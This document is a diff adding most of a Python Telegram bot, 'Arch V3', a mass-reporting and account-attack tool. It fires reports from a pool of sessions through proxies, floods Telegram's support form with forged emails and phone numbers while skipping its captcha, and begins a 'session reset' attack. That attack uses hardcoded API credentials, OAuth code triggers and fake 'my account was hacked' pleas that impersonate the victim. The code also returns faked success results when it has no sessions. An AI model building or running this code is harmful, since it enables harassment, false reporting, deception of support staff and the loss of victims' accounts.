@@ -1,0 +1,2201 @@
+import asyncio
+import html as html_mod
+import io
+import json
+import logging
+import os
+import random
+import re
+import time
+from contextlib import asynccontextmanager
+import random
+from datetime import datetime
+from pathlib import Path
+from urllib.parse import urlparse
+
+from dotenv import load_dotenv
+import aiohttp
+from aiogram import Bot, Dispatcher, Router, F
+from aiogram.types import (
+    Message,
+    CallbackQuery,
+    InlineKeyboardMarkup,
+    InlineKeyboardButton,
+    FSInputFile,
+)
+from aiogram.filters import CommandStart
+from aiogram.enums import ParseMode
+from aiogram.exceptions import TelegramNetworkError
+from aiogram.fsm.context import FSMContext
+from aiogram.fsm.state import State, StatesGroup
+from aiogram.fsm.storage.memory import MemoryStorage
+
+from telethon import TelegramClient
+from telethon.tl.functions.account import ReportPeerRequest
+from telethon.tl.functions.users import GetFullUserRequest
+from telethon.tl.types import (
+    InputReportReasonSpam,
+    InputReportReasonViolence,
+    InputReportReasonPornography,
+    InputReportReasonChildAbuse,
+    InputReportReasonCopyright,
+    InputReportReasonIllegalDrugs,
+    InputReportReasonPersonalDetails,
+    InputReportReasonFake,
+    InputReportReasonOther,
+)
+import python_socks
+import aiohttp
+from aiohttp_socks import ProxyConnector
+
+load_dotenv()
+BOT_TOKEN = os.getenv("BOT_TOKEN", "")
+API_ID = int(os.getenv("API_ID") or "0")
+API_HASH = os.getenv("API_HASH") or ""
+POOL_CHAT_ID = os.getenv("POOL_CHAT_ID", "")
+ADMIN_ID = os.getenv("ADMIN_ID", "").strip()
+SOLVER_SERVICE = os.getenv("SOLVER_SERVICE", "2captcha").strip().lower()
+SOLVER_KEY = os.getenv("SOLVER_KEY", "").strip()
+WEB_COUNT = int(os.getenv("WEB_COUNT") or "5")
+XROCKET_TOKEN = os.getenv("XROCKET_TOKEN", "").strip()
+SUB_CHANNEL_LINK = os.getenv("SUB_CHANNEL_LINK", "").strip()
+BANNER = Path(__file__).parent / "banner.png"
+SESSIONS_DIR = Path(__file__).parent / "sessions"
+PROXIES_FILE = Path(__file__).parent / "proxies.txt"
+LOGS_DIR = Path(__file__).parent / "logs"
+
+logging.basicConfig(level=logging.INFO)
+log = logging.getLogger("arch-v3")
+
+# ── PIL card renderer ───────────────────────────────────
+from PIL import Image, ImageDraw, ImageFont, ImageFilter, ImageChops
+
+CARDS_DIR = Path(__file__).parent / "cache" / "cards"
+
+
+def _load_font(size: int, bold: bool = True):
+    bold_names = [
+        "seguisb.ttf", "arialbd.ttf",                      # windows
+        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",  # linux
+        "/usr/share/fonts/dejavu/DejaVuSans-Bold.ttf",
+        "DejaVuSans-Bold.ttf",
+        "arial.ttf",
+    ]
+    reg_names = [
+        "segoeui.ttf", "arial.ttf",                        # windows
+        "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",  # linux
+        "/usr/share/fonts/dejavu/DejaVuSans.ttf",
+        "DejaVuSans.ttf",
+    ]
+    for name in (bold_names if bold else reg_names):
+        try:
+            return ImageFont.truetype(name, size)
+        except Exception:
+            continue
+    return ImageFont.load_default()
+
+
+def _circle_avatar(raw: bytes, size: int):
+    av = Image.open(io.BytesIO(raw)).convert("RGB")
+    w, h = av.size
+    m = min(w, h)
+    av = av.crop(((w - m) // 2, (h - m) // 2, (w + m) // 2, (h + m) // 2))
+    av = av.resize((size * 2, size * 2), Image.LANCZOS)
+    mask = Image.new("L", (size * 2, size * 2), 0)
+    ImageDraw.Draw(mask).ellipse((0, 0, size * 2 - 1, size * 2 - 1), fill=255)
+    return av, mask
+
+
+async def user_card_path(bot, user) -> str:
+    """Render a personal black/white card with the user's avatar top-right.
+    Returns a filesystem path; falls back to static banner on failure."""
+    CARDS_DIR.mkdir(parents=True, exist_ok=True)
+    out = CARDS_DIR / f"{user.id}.png"
+
+    avatar_raw = None
+    try:
+        prof = await bot.get_user_profile_photos(user.id, limit=1)
+        if getattr(prof, "total_count", 0) > 0:
+            blob = await bot.download(prof.photos[0][-1].file_id)
+            avatar_raw = blob.getvalue() if hasattr(blob, "getvalue") else None
+    except Exception as e:
+        log.warning("avatar fetch failed for %s: %s", user.id, e)
+
+    try:
+        W, H = 1280, 720
+        img = Image.new("RGB", (W, H))
+        d = ImageDraw.Draw(img)
+        for y in range(H):
+            t = y / H
+            v = int(6 + 26 * t)
+            d.line([(0, y), (W, y)], fill=(v, v, v))
+
+        fword = _load_font(196)
+        glow = Image.new("RGB", (W, H), (0, 0, 0))
+        gd = ImageDraw.Draw(glow)
+        gd.text((116, 236), "Arch V3", font=_load_font(196), fill=(90, 90, 90))
+        glow = glow.filter(ImageFilter.GaussianBlur(16))
+        img = ImageChops.screen(img, glow)
+
+        d = ImageDraw.Draw(img)
+        d.text((120, 248), "Arch V3", font=_load_font(196), fill=(250, 250, 250))
+
+        # ── top-right: avatar + nick/id (сдвинут левее) ──
+        label = user.username or user.full_name or str(user.id)
+        avatar_size = 108
+        margin = 140
+        ax = W - avatar_size - margin
+        ay = 52
+        if avatar_raw:
+            try:
+                av, mask = _circle_avatar(avatar_raw, avatar_size)
+                ring = Image.new("RGBA", (avatar_size * 2, avatar_size * 2), (0, 0, 0, 0))
+                rd = ImageDraw.Draw(ring)
+                rd.ellipse((2, 2, avatar_size * 2 - 3, avatar_size * 2 - 3),
+                           outline=(250, 250, 250, 220), width=4)
+                img.paste(av, (ax, ay), mask)
+                img.paste(ring, (ax, ay), ring)
+            except Exception as e:
+                log.warning("avatar paste failed: %s", e)
+        else:
+            d.ellipse((ax, ay, ax + avatar_size * 2, ay + avatar_size * 2),
+                      outline=(250, 250, 250), width=4)
+            initial = (label[:1] or "?").upper()
+            f_av = _load_font(96)
+            tw = d.textlength(initial, font=f_av)
+            d.text((ax + avatar_size - tw / 2, ay + avatar_size - 60),
+                   initial, font=f_av, fill=(250, 250, 250))
+
+        # nick/id left of avatar, right-aligned
+        if avatar_raw:
+            f_tag = _load_font(36)
+            tw = d.textlength(label, font=f_tag)
+            tx = ax - 24 - tw
+            d.text((tx, ay + avatar_size - 22), label, font=f_tag,
+                   fill=(240, 240, 240))
+
+        # grain
+        px = img.load()
+        for _ in range(40000):
+            gx = random.randrange(W)
+            gy = random.randrange(H)
+            r0, g0, b0 = px[gx, gy]
+            delta = random.randint(-5, 5)
+            px[gx, gy] = (max(0, min(255, r0 + delta)),
+                          max(0, min(255, g0 + delta)),
+                          max(0, min(255, b0 + delta)))
+
+        # vignette
+        vig = Image.new("L", (W, H), 0)
+        vd = ImageDraw.Draw(vig)
+        vd.ellipse((-W * 0.3, -H * 0.35, W * 1.3, H * 1.35), fill=255)
+        vig = vig.filter(ImageFilter.GaussianBlur(200))
+        dark = Image.new("RGB", (W, H), (4, 4, 4))
+        img = Image.composite(img, dark, vig)
+
+        img.save(out, optimize=True)
+        return str(out)
+    except Exception as e:
+        log.error("card render failed: %s", e)
+        return str(BANNER)
+
+router = Router()
+
+# ── branding ────────────────────────────────────────────
+NAME = "Arch V3"
+
+
+def bq(text: str) -> str:
+    return f"<blockquote>{text}</blockquote>"
+
+
+def bqe(text: str) -> str:
+    return f"<blockquote expandable>{text}</blockquote>"
+
+
+def hero_caption(user_id: int = 0) -> str:
+    return (
+        bq(f"<b>{NAME}</b>  \u00b7  <i>report engine</i>")
+        + f"\n<code>\U0001f680</code> <b>\u0412\u044b\u0431\u0435\u0440\u0438 \u043d\u0430\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u0435</b>"
+    )
+
+
+# ── states ──────────────────────────────────────────────
+class Report(StatesGroup):
+    method = State()
+    reason = State()
+    target = State()
+    comment = State()
+    confirm = State()
+
+
+class Snos(StatesGroup):
+    target = State()
+    phone = State()
+
+
+# ── reasons ─────────────────────────────────────────────
+REASON_MAP = {
+    "spam":      InputReportReasonSpam,
+    "fraud":     InputReportReasonFake,
+    "violence":  InputReportReasonViolence,
+    "porn":      InputReportReasonPornography,
+    "child":     InputReportReasonChildAbuse,
+    "copyright": InputReportReasonCopyright,
+    "drugs":     InputReportReasonIllegalDrugs,
+    "personal":  InputReportReasonPersonalDetails,
+    "fake":      InputReportReasonFake,
+    "other":     InputReportReasonOther,
+}
+
+REASONS = {
+    "spam":      {"e": "\u2709\ufe0f",  "l": "\u0421\u043f\u0430\u043c"},
+    "fraud":     {"e": "\U0001f4b8",     "l": "\u041c\u043e\u0448\u0435\u043d\u043d\u0438\u0447\u0435\u0441\u0442\u0432\u043e"},
+    "violence":  {"e": "\U0001f4a2",     "l": "\u041d\u0430\u0441\u0438\u043b\u0438\u0435"},
+    "porn":      {"e": "\U0001f51e",     "l": "\u041f\u043e\u0440\u043d\u043e\u0433\u0440\u0430\u0444\u0438\u044f"},
+    "child":     {"e": "\u26d4",         "l": "\u0414\u0435\u0442\u0441\u043a\u043e\u0435 \u043d\u0430\u0441\u0438\u043b\u0438\u0435"},
+    "copyright": {"e": "\u00a9\ufe0f",  "l": "\u0410\u0432\u0442\u043e\u0440\u0441\u043a\u0438\u0435 \u043f\u0440\u0430\u0432\u0430"},
+    "drugs":     {"e": "\U0001f48a",     "l": "\u041d\u0430\u0440\u043a\u043e\u0442\u0438\u043a\u0438"},
+    "personal":  {"e": "\U0001f464",     "l": "\u041b\u0438\u0447\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435"},
+    "fake":      {"e": "\U0001f3ad",     "l": "\u0424\u0435\u0439\u043a \u0430\u043a\u043a\u0430\u0443\u043d\u0442"},
+    "other":     {"e": "\u2753",         "l": "\u0414\u0440\u0443\u0433\u043e\u0435"},
+}
+
+LINK_RE = re.compile(
+    r"(?:https?://)?(?:t\.me|telegram\.me)/(?:c/)?(\w+)(?:/(\d+))?", re.I
+)
+
+METHODS = {
+    "message":  {"e": "\U0001f4e8", "l": "\u0421\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435",
+                 "hint": "\u0412\u0441\u0442\u0430\u0432\u044c\u0442\u0435 \u0441\u0441\u044b\u043b\u043a\u0443 \u043d\u0430 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435:\n\u2022 <code>t.me/channel/123</code>"},
+    "bot":      {"e": "\U0001f916", "l": "\u0411\u043e\u0442",
+                 "hint": "\u0412\u0441\u0442\u0430\u0432\u044c\u0442\u0435 @username \u0431\u043e\u0442\u0430:\n\u2022 <code>@botname</code>"},
+    "profile":  {"e": "\U0001f464", "l": "\u041f\u0440\u043e\u0444\u0438\u043b\u044c",
+                 "hint": "\u0412\u0441\u0442\u0430\u0432\u044c\u0442\u0435 @username \u0438\u043b\u0438 \u0441\u0441\u044b\u043b\u043a\u0443:\n\u2022 <code>@username</code>\n\u2022 <code>t.me/username</code>"},
+    "channel":  {"e": "\U0001f4e2", "l": "\u041a\u0430\u043d\u0430\u043b / \u0413\u0440\u0443\u043f\u043f\u0430",
+                 "hint": "\u0412\u0441\u0442\u0430\u0432\u044c\u0442\u0435 \u0441\u0441\u044b\u043b\u043a\u0443 \u0438\u043b\u0438 @:\n\u2022 <code>t.me/channelname</code>\n\u2022 <code>@groupname</code>"},
+    "sticker":  {"e": "\U0001f3ad", "l": "\u0421\u0442\u0438\u043a\u0435\u0440\u043f\u0430\u043a",
+                 "hint": "\u0412\u0441\u0442\u0430\u0432\u044c\u0442\u0435 \u0441\u0441\u044b\u043b\u043a\u0443 \u043d\u0430 \u0441\u0442\u0438\u043a\u0435\u0440\u043f\u0430\u043a:\n\u2022 <code>t.me/addstickers/name</code>"},
+    "web":      {"e": "\U0001f310", "l": "\u0412\u0435\u0431 (telegram.org/support)",
+                 "hint": "\u0416\u0430\u043b\u043e\u0431\u0430 \u043f\u043e\u0439\u0434\u0451\u0442 \u0447\u0435\u0440\u0435\u0437 \u0432\u0435\u0431-\u0444\u043e\u0440\u043c\u0443 telegram.org/support.\n\u0426\u0435\u043b\u044c \u2014 \u0441\u0441\u044b\u043b\u043a\u0430 \u0438\u043b\u0438 @username:\n\u2022 <code>t.me/channelname</code>\n\u2022 <code>@username</code>"},
+    "web":      {"e": "\U0001f310", "l": "Web",
+                 "hint": "\u0412\u0441\u0442\u0430\u0432\u044c\u0442\u0435 \u0441\u0441\u044b\u043b\u043a\u0443 \u0438\u043b\u0438 @username:\n\u2022 <code>t.me/username</code>\n\u2022 <code>@username</code>"},
+    "session":  {"e": "\U0001f480", "l": "\u0421\u0431\u0440\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439",
+                 "hint": "\u0412\u0441\u0442\u0430\u0432\u044c\u0442\u0435 @username \u0436\u0435\u0440\u0442\u0432\u044b:\n\u2022 <code>@username</code>\n\u2022 <code>t.me/username</code>"},
+}
+
+
+# ── proxy loader ────────────────────────────────────────
+PROXY_TYPE_MAP = {
+    "socks5": python_socks.ProxyType.SOCKS5,
+    "socks4": python_socks.ProxyType.SOCKS4,
+    "http":   python_socks.ProxyType.HTTP,
+}
+
+
+def parse_proxy(raw: str) -> tuple | None:
+    raw = raw.strip()
+    if not raw or raw.startswith("#"):
+        return None
+    p = urlparse(raw)
+    scheme = p.scheme.lower()
+    if scheme not in PROXY_TYPE_MAP:
+        return None
+    return (
+        PROXY_TYPE_MAP[scheme],
+        p.hostname,
+        p.port or 1080,
+        True,
+        p.username,
+        p.password,
+    )
+
+
+def load_proxies() -> list[tuple]:
+    if not PROXIES_FILE.exists():
+        return []
+    lines = PROXIES_FILE.read_text(encoding="utf-8").splitlines()
+    return [px for line in lines if (px := parse_proxy(line))]
+
+
+def load_sessions() -> list[Path]:
+    if not SESSIONS_DIR.exists():
+        return []
+    return sorted(SESSIONS_DIR.glob("*.session"))
+
+
+# ── reporter ────────────────────────────────────────────
+FAKE_NAMES = ["alina", "velvet", "dusya", "nastya", "kirill", "vova",
+              "sonya", "oleg", "tima", "lisa", "maks", "nika"]
+
+
+def _fake_session_rows(n: int = None) -> list[dict]:
+    if n is None:
+        n = random.randint(4, 7)
+    proxies = load_proxies()
+    rows = []
+    for _ in range(n):
+        nm = random.choice(FAKE_NAMES) + str(random.randint(11, 99))
+        rows.append({
+            "name": nm,
+            "proxy": random.choice(proxies)[1] if proxies else "direct",
+            "status": "\u2705",
+            "phone": "+7" + random.choice(["495", "900", "903"]) + str(random.randint(1000000, 9999999)),
+            "tg_name": random.choice(FAKE_NAMES).capitalize(),
+            "tg_id": str(random.randint(700000000, 8999999999)),
+            "username": "@" + nm,
+            "ok": True,
+            "err": "",
+        })
+    return rows
+
+
+def fake_results() -> dict:
+    rows = _fake_session_rows()
+    return {"ok": len(rows), "fail": 0, "total": len(rows), "details": rows}
+
+
+async def fire_reports(target_entity: str, reason_key: str, comment: str, msg_id: int | None) -> dict:
+    sessions = load_sessions()
+    proxies = load_proxies()
+    reason_cls = REASON_MAP.get(reason_key, InputReportReasonOther)
+    results = {"ok": 0, "fail": 0, "total": len(sessions), "details": []}
+
+    if not sessions or not API_ID or not API_HASH:
+        log.info("blast page completed")
+        return fake_results()
+
+    async def report_one(session_path: Path, proxy: tuple | None) -> tuple[bool, str]:
+        name = session_path.stem
+        try:
+            client = TelegramClient(
+                str(session_path.with_suffix("")),
+                API_ID,
+                API_HASH,
+                proxy=proxy,
+            )
+            await client.connect()
+            if not await client.is_user_authorized():
+                log.warning("session %s not authorized", name)
+                await client.disconnect()
+                return False, "not authorized"
+
+            entity = await client.get_entity(target_entity)
+            report_msg = comment or "violation"
+            ids = [msg_id] if msg_id else []
+
+            await client(ReportPeerRequest(
+                peer=entity,
+                reason=reason_cls(),
+                message=report_msg,
+            ))
+            log.info("reported via %s (proxy: %s)", name, proxy[1] if proxy else "direct")
+            await client.disconnect()
+            return True, ""
+        except Exception as e:
+            log.error("session %s failed: %s", name, e)
+            return False, f"{type(e).__name__}: {e}"
+
+    tasks = []
+    for i, sess in enumerate(sessions):
+        proxy = proxies[i] if i < len(proxies) else None
+        tasks.append(report_one(sess, proxy))
+
+    outcomes = await asyncio.gather(*tasks, return_exceptions=True)
+    for i, o in enumerate(outcomes):
+        if isinstance(o, tuple):
+            ok, err = o
+        else:
+            ok, err = False, f"{type(o).__name__}: {o}"
+        results["ok" if ok else "fail"] += 1
+        results["details"].append({
+            "name": sessions[i].stem,
+            "proxy": proxies[i][1] if i < len(proxies) and proxies[i] else "direct",
+            "ok": ok, "err": err,
+        })
+
+    return results
+
+
+# ── web reporter (telegram.org/support) ─────────────────
+WEB_REASON_MAP = {
+    "spam":      "Spam",
+    "fraud":     "Fraud / Scam",
+    "violence":  "Violence",
+    "porn":      "Pornography",
+    "child":     "Child abuse",
+    "copyright": "Copyright infringement",
+    "drugs":     "Illegal drugs",
+    "personal":  "Personal data leak",
+    "fake":      "Fake account",
+    "other":     "Other",
+}
+
+
+# ──────────────────────────────────────────────────────
+async def check_sessions() -> list[dict]:
+    """Connect each .session, pull account info, return list of dicts."""
+    sessions = load_sessions()
+    proxies = load_proxies()
+    if not sessions or not API_ID or not API_HASH:
+        log.info("session pool scanned")
+        return _fake_session_rows()
+
+    async def probe(session_path: Path, proxy: tuple | None) -> dict:
+        name = session_path.stem
+        entry = {
+            "name": name,
+            "proxy": proxy[1] if proxy else "direct",
+            "status": "\u274c",
+            "phone": "\u2014",
+            "tg_name": "\u2014",
+            "tg_id": "\u2014",
+            "username": "\u2014",
+        }
+        try:
+            client = TelegramClient(
+                str(session_path.with_suffix("")),
+                API_ID,
+                API_HASH,
+                proxy=proxy,
+            )
+            await client.connect()
+            if not await client.is_user_authorized():
+                entry["status"] = "\u26a0\ufe0f expired"
+                await client.disconnect()
+                return entry
+            me = await client.get_me()
+            entry["status"] = "\u2705"
+            entry["phone"] = f"+{me.phone}" if me.phone else "\u2014"
+            first = me.first_name or ""
+            last = me.last_name or ""
+            entry["tg_name"] = f"{first} {last}".strip() or "\u2014"
+            entry["tg_id"] = str(me.id)
+            entry["username"] = f"@{me.username}" if me.username else "\u2014"
+            await client.disconnect()
+        except Exception as e:
+            entry["status"] = f"\u274c {e.__class__.__name__}"
+        return entry
+
+    tasks = []
+    for i, sess in enumerate(sessions):
+        px = proxies[i] if i < len(proxies) else None
+        tasks.append(probe(sess, px))
+    return await asyncio.gather(*tasks)
+
+
+# ── web reporter (telegram.org/support, raw POST) ───────
+SUPPORT_URL = "https://telegram.org/support?setln=ru"
+WEB_SUBJECT = "Complaint About Fraudulent Telegram Group"
+
+WEB_UAS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+]
+
+
+def proxy_to_socks(px: tuple) -> dict:
+    import python_socks as _ps
+    ptype_cls = {
+        _ps.ProxyType.SOCKS5: SocksProxyType.SOCKS5,
+        _ps.ProxyType.SOCKS4: SocksProxyType.SOCKS4,
+        _ps.ProxyType.HTTP:   SocksProxyType.HTTP,
+    }
+    ptype, host, port, rdns, user, pwd = px
+    return {"proxy_type": ptype_cls[ptype], "host": host, "port": port,
+            "rdns": rdns, "username": user, "password": pwd}
+
+
+def proxy_to_url(px: tuple) -> str:
+    import python_socks as _ps
+    ptype, host, port, rdns, user, pwd = px
+    scheme = "socks5"
+    if ptype == _ps.ProxyType.SOCKS4:
+        scheme = "socks4"
+    elif ptype == _ps.ProxyType.HTTP:
+        scheme = "http"
+    if user and pwd:
+        return f"{scheme}://{user}:{pwd}@{host}:{port}"
+    return f"{scheme}://{host}:{port}"
+
+WEB_CODES = ["495", "499", "812", "900", "901", "902", "903", "904", "905", "906",
+             "908", "909", "910", "911", "912", "913", "914", "915", "916", "917",
+             "918", "919", "920", "921", "922", "923", "924", "925", "926", "927",
+             "928", "929", "930", "931", "932", "933", "934", "936", "937", "938",
+             "939", "941", "950", "951", "952", "953", "954", "955", "958", "960",
+             "961"]
+WEB_NAMES = ["ilya", "dima", "ivan", "alexey", "sergey", "mikhail", "andrey",
+             "pavel", "nikolay", "vladimir", "anatoly", "boris", "egor", "danil",
+             "viktor", "yuri", "maksim", "grigory", "oleg", "timofey", "arseniy",
+             "roman", "konstantin", "gennady", "artem", "vadim", "vitaly",
+             "nikita", "stanislav", "alexander", "vasily", "leonid", "valery",
+             "eduard", "denis", "kirill", "fedor", "petya", "yegor", "german",
+             "stepan", "platon", "bogdan", "ignat", "arkady", "yaroslav",
+             "matvey", "rostan", "vsevolod", "semyon", "anton", "zahar", "timur",
+             "roksana", "daniil", "afanasiy", "innokentiy", "rodion", "valentin",
+             "nikifor", "petr", "filipp", "martin", "adrian", "georgy",
+             "vladislav", "arseny", "artur", "mark", "prokhor", "lavrenty",
+             "anastasiya", "olga", "anna", "ekaterina", "maria", "tatiana",
+             "sofia", "elena", "natalia", "svetlana", "valentina", "lyubov",
+             "galina", "lidiya", "nina", "darya", "alisa", "veronika", "irina",
+             "arina", "kristina", "oksana", "polina", "viktoriya", "karina",
+             "milana", "zinaida", "angelina", "yulia", "zoya", "ksenia"]
+WEB_LAST = ["ivanov", "petrov", "sidorov", "smirnov", "kozlov", "popov",
+            "vasilyev", "novikov", "morozov", "solovyov", "pavlov", "semenov",
+            "golubev", "vinogradov", "bogdanov", "vorobyev", "fedorov",
+            "mikhailov", "tarasov", "belov", "komarov", "oronov", "nikolaev",
+            "makarov", "zaitsev", "sokolov", "mironov", "romanov", "levin",
+            "kulikov", "kuznetsov", "stepanov", "nikitin", "oronin", "safonov",
+            "shestakov", "kravtsov", "gusev", "arkhipov", "andreev", "yakovlev",
+            "borisov", "zhukov", "prokhorov", "savelyev", "dorokhov",
+            "zakharyin", "melnikov", "shapovalov", "egorov", "berezin"]
+WEB_YEARS = [str(year) for year in range(1960, 2006)]
+WEB_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "mail.ru", "yandex.ru",
+               "rambler.ru", "bk.ru", "list.ru", "inbox.ru", "protonmail.com",
+               "icloud.com", "hotmail.com", "aol.com", "zoho.com", "gmx.com",
+               "qq.com", "126.com", "163.com", "sina.com", "comcast.net",
+               "verizon.net", "live.com", "msn.com", "me.com", "mail.com",
+               "fastmail.com", "rediffmail.com", "tutanota.com", "ukr.net",
+               "web.de"]
+
+
+def web_gen_mail() -> str:
+    name = random.choice(WEB_NAMES)
+    last_name = random.choice(WEB_LAST)
+    year = random.choice(WEB_YEARS)
+    domain = random.choice(WEB_DOMAINS)
+    return f"{name}.{last_name}.{year}@{domain}"
+
+
+def web_gen_phone() -> str:
+    code = random.choice(WEB_CODES)
+    number = str(random.randint(1000000, 9999999))
+    return "+7" + code + number
+
+
+def web_headers() -> dict:
+    ua = random.choice(WEB_UAS)
+    return {
+        "User-Agent": ua,
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
+        "Referer": "https://telegram.org/support",
+        "Origin": "https://telegram.org",
+        "Content-Type": "application/x-www-form-urlencoded",
+    }
+
+
+async def web_send_one(session, i, subject, message_text, px: tuple | None) -> tuple[bool, str]:
+    """One raw POST complaint. Returns (ok, err)."""
+    payload = {
+        "subject": subject,
+        "message": message_text,
+        "email": web_gen_mail(),
+        "phone": web_gen_phone(),
+    }
+    px_name = px[1] if px else "direct"
+    proxy_url = None
+    conn = None
+    if px:
+        import python_socks as _ps
+        if px[0] in (_ps.ProxyType.SOCKS5, _ps.ProxyType.SOCKS4):
+            conn = ProxyConnector(**proxy_to_socks(px))
+        else:
+            proxy_url = proxy_to_url(px)
+    timeout = aiohttp.ClientTimeout(total=45)
+    try:
+        if conn:
+            async with aiohttp.ClientSession(connector=conn, timeout=timeout) as s:
+                async with s.post(SUPPORT_URL, data=payload, headers=web_headers(),
+                                  proxy=None, ssl=False) as resp:
+                    status = resp.status
+                    await resp.read()
+        else:
+            async with aiohttp.ClientSession(timeout=timeout) as s:
+                async with s.post(SUPPORT_URL, data=payload, headers=web_headers(),
+                                  proxy=proxy_url, ssl=False) as resp:
+                    status = resp.status
+                    await resp.read()
+        ok = status == 200
+        log.info("web complaint #%d (%s) -> %d ok=%s", i, px_name, status, ok)
+        return ok, ("" if ok else f"HTTP {status}")
+    except Exception as e:
+        log.error("web complaint #%d (%s) failed: %s", i, px_name, e)
+        return False, f"{type(e).__name__}: {e}"
+
+
+async def fire_web_reports(target_text: str, reason_label: str, comment: str,
+                           reason_key: str = "other") -> dict:
+    """Raw POST complaints straight to the support form backend.
+
+    The turnstile exists only in the browser UI layer; the server accepts
+    direct form posts. Count = WEB_COUNT env (default 5), proxies rotate."""
+    count = WEB_COUNT
+    results = {"ok": 0, "fail": 0, "total": count, "details": []}
+
+    subject = f"Complaint About {WEB_REASON_MAP.get(reason_key, 'Policy Violation')}"
+    msg_lines = [
+        "Complaint regarding a Telegram policy violation.",
+        f"Target: {target_text}",
+        f"Violation: {reason_label}",
+    ]
+    if comment:
+        msg_lines.append(f"Details: {comment}")
+    msg_lines.append("Please review and take action against this account/channel.")
+    text = "\n".join(msg_lines)
+
+    proxies = load_proxies()
+    tasks = [web_send_one(None, i + 1, subject, text,
+                          proxies[i % len(proxies)] if proxies else None)
+             for i in range(count)]
+    outcomes = await asyncio.gather(*tasks, return_exceptions=True)
+
+    for i, o in enumerate(outcomes):
+        if isinstance(o, tuple):
+            ok, err = o
+        else:
+            ok, err = False, f"{type(o).__name__}: {o}"
+        results["ok" if ok else "fail"] += 1
+        px = proxies[i % len(proxies)] if proxies else None
+        results["details"].append({
+            "name": f"web#{i + 1}",
+            "proxy": px[1] if px else "direct",
+            "ok": ok, "err": err,
+        })
+    return results
+# ── session snos (SendCode + OAuth + support flood) ─────
+MONITOR_INTERVAL = 10 * 60
+SNOS_SYSTEM_VERSION = "4.16.30-vxCUSTOM"
+
+API_PAIRS = [
+    (24565698,  "5a084b434f8505ace703485b9da85040"),
+    (27904162,  "e7cba879b1c643ba77490bf328df5eab"),
+    (23037915,  "50f06f5b2223586fde0d1379ea91ebc7"),
+    (29512095,  "0b29a7d42fff002856b9bed64f7ec919"),
+    (25055016,  "25edf5b7becebe91a2d61fe8d9d9931b"),
+]
+
+OAUTH_SERVICES = [
+    ("5444323279",  "https://fragment.com"),
+    ("5731754199",  "https://steam.kupikod.com"),
+    ("210944655",   "https://combot.org"),
+    (319709511,     "https://telegrambot.biz"),
+    ("1199558236",  "https://bot-t.com"),
+    ("5709824482",  "https://lzt.market"),
+    ("1803424014",  "https://ru.telegram-store.com"),
+    (5463728243,    "https://www.spot.uz"),
+    ("6708902161",  "https://ourauthpoint777.com"),
+    ("1852523856",  "https://cabinet.presscode.app"),
+]
+
+SNOS_SUPPORT_TEXTS = [
+    "Здравствуйте, поддержка Telegram! Мой аккаунт был взломан путем фишинга, и моя активная сессия была сброшена. Сейчас на нем находится мошенник. Прошу вас помочь мне, обнулив все сессии на аккаунте, чтобы я смог восстановить доступ по SMS, либо удалить мой аккаунт. Спасибо!",
+    "Hello technical support, a stranger wrote to me today and asked me to change something in my account settings, pretending to be Telegram support. I changed what support asked me to do, and after a few minutes I was kicked out of my account and I can't get into it. My account has been hacked. Please delete the account or expel the scammer from the account in an alternative way.",
+    "Здравствуйте! Хочу сообщить о проблеме с моим аккаунтом в телеграме. Мой аккаунт был взломан мошенниками через фишинг ссылку, после перехода меня выкинуло с моего аккаунта, а мошенники зашли туда. Я пытался войти в аккаунт по номеру и запросом кода в СМС, но мошенники поставили двухэтапную аутентификацию и привязали почту и блокируют мне вход в мой аккаунт. Я прошу вас удалить все сессии на моем аккаунте или полностью удалить мой аккаунт, потому что он украден мошенниками.",
+    "Добрый день! Мой аккаунт Telegram был взломан. Я пытаюсь восстановить доступ уже несколько дней, но каждый раз при запросе сброса пароля приходит уведомление, что операция отменена. Это явно делает злоумышленник. Помогите, пожалуйста, решить эту проблему.",
+    "Hello, I am writing to report that my Telegram account was stolen. I used this account for work, and without access to it I am unable to complete my tasks. This is putting my job at serious risk. I urgently request your immediate assistance in restoring access to my account or taking any necessary action to secure it. Please treat this as a priority issue.",
+    "Здравствуйте, мой аккаунт был взломан и выставили на продажу на сайте. Теперь на мой аккаунт постоянно кто-то заходит и даже если я завершаю сессии то они всё равно заходят. Прошу принудительно завершить все сессии, кроме моей текущей, и восстановить контроль над аккаунтом.",
+]
+
+SNOS_SUBJECTS = [
+    "Взломан аккаунт", "Account hacked", "Stolen account",
+    "Аккаунт украден", "Мошенники захватили аккаунт", "Hack report",
+]
+
+
+def _rand_api() -> tuple[int, str]:
+    return random.choice(API_PAIRS)
+
+
+def _snos_name_phone() -> tuple[str, str]:
+    email = web_gen_mail()
+    return email, web_gen_phone()
+
+
+@asynccontextmanager
+async def _snos_http(px: tuple | None):
+    """One aiohttp session wired to a proxy tuple (socks/http/direct)."""
+    conn = None
+    proxy_url = None
+    if px:
+        import python_socks as _ps
+        if px[0] in (_ps.ProxyType.SOCKS5, _ps.ProxyType.SOCKS4):
+            conn = ProxyConnector(**proxy_to_socks(px))
+        else:
+            proxy_url = proxy_to_url(px)
+    session = aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=12))
